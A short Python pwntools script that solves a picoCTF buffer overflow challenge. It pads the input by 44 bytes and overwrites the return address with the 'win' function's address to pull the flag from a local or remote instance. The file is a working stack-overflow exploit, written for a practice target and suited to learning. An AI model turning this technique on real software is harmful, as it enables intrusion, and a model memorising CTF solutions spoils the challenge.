#!/usr/bin/env python3

from sys import argv
from pwn import *

BIN = './buffer_overflow_1.bin'

IP = 'saturn.picoctf.net'
PORT = 57942

elf = ELF(BIN)


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


p = open_instance()

# generate payload
padding = b'A' * (32 + 12)
win_addr = elf.symbols['win']
payload = padding + p32(win_addr)

# send payload
p.readuntil(b'Please enter your string:')
p.sendline(payload)

# read flag
flag = p.recvall().strip()
print(flag.decode())
